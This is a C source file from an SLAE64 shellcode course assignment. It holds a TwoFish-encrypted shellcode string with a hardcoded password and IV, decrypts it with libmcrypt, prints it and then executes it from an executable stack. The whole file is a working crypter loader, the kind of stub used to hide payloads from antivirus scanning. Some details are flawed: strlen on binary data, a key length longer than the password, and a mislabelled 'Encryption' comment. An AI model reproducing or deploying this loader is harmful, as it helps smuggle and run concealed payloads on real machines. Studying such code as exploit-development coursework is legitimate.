/*
 Author: Guillem Alminyana
 Student ID: PA-14628
 SLAE64 Assignment #7
 =====================================
*/

/*
This piece of code decrypts a shellcode string using TwoFish and then executes it. 
This is done by using the mcrypt library (apt-get install libmcrypt-dev).

Global vars:

    unsigned char code[] -> string with the shellcode
    char password[]      -> Password used for encryption
    unsigned char IV     -> IVs used by TwoFish in the process

NOTE: password and IV must be initialized with the values of the Crypter.
      Values been printed in the screen

Compile using gcc: 

  gcc -L/usr/include -lmcrypt -fno-stack-protector -z execstack TwoFish_Decrypter.c -o TwoFish_Decrypter

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>

/*
  TwoFish needed setups
*/

#define IV_SIZE 16
unsigned char password[] = "12345678";
unsigned char IV[IV_SIZE] = \
"\x4b\x43\x90\xbe\x44\x14\x30\x8a\x31\x3d\xed\xba\xfd\x1f\x35\x5e";


/*
  ShellCode to decrypt
*/
unsigned char code[]= \
"\xac\x8a\x9f\x32\x01\xa0\x32\xf2\x2d\xdc\xa6\xd9\xbe\xe7\x54\xe4\xa2\xbc\x05\x54\x10\x75\x13\xad\xf5\xb2\xa6\xc8\x09\xcc\xc8\x0d";

int main (void)
{

	MCRYPT id_crypt;
	int code_length = strlen(code);

	printf("\nCrypted Shellcode (%d bytes):\n", code_length);
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove last ","

	/* MCrypt TwoFish Initialization */
	id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL);

	/* IV initialization */
	printf("\n\nTwoFish IV value: ");
	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
	for (int i = 0; i < iv_size-1; i++)
	{
		printf("0x%02x,", IV[i]);
	}
	printf("0x%02x", IV[iv_size-1]);	// Remove ","

	/* Print Password used for crypting */
	printf("\nTwoFish Password Used: %s", password);

	/* Initialize the encryption process with the pass and IV */
	int x = mcrypt_generic_init(id_crypt, password, 16, IV);
	if (x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Encryption of the code[] string */
	x = mdecrypt_generic(id_crypt, code, code_length);
	if ( x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Print the decrypted shellcode */
	printf("\n\nDeCrypted Shellcode:\n\n  ASM Format: \n");

		/* First printed in ASM format */
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove ","

		/* Now printed in C format */
	printf("\n\n  C Format: \n");
	for (int i = 0; i < code_length-1; i++)
	{
		printf("\\x%02x,", code[i]);
	}
	printf("\\x%02x", code[code_length-1]);

	/* End the mcrypt */
	mcrypt_generic_end(id_crypt);


	printf("\n\n");

	/* Lets run the shellcode */
	int (*ret)() = (int(*)())code;
	ret();
	
	;return(0);
	
}	

